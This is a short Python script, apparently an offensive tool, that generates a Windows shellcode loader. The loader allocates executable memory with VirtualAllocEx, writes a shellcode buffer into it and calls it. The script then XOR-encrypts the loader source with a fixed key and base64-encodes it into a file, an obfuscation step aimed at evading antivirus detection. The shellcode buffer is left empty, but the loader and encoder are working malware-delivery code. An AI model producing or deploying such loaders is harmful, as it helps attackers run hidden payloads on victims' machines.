import base64

buf =  b""

bb = ''.join(f'\\x{b:02x}' for b in buf)
text = f'''
import ctypes
from ctypes import wintypes
buf = b"{bb}"
kernel32 = ctypes.windll.kernel32
kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID
kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL
current_process = kernel32.GetCurrentProcess()
sc_memory = kernel32.VirtualAllocEx(current_process, None, len(buf), 0x1000, 0x40)
bytes_written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(current_process, sc_memory,ctypes.c_char_p(buf),len(buf),ctypes.byref(bytes_written))
shell_func = ctypes.CFUNCTYPE(None)(sc_memory)
shell_func()
'''
key = b'password123'
x = bytearray(b ^ key[i % len(key)] for i, b in enumerate(text.encode("utf-8")))
with open('bin.txt', 'w') as f:
    f.write(base64.b64encode(x).decode('ascii'))
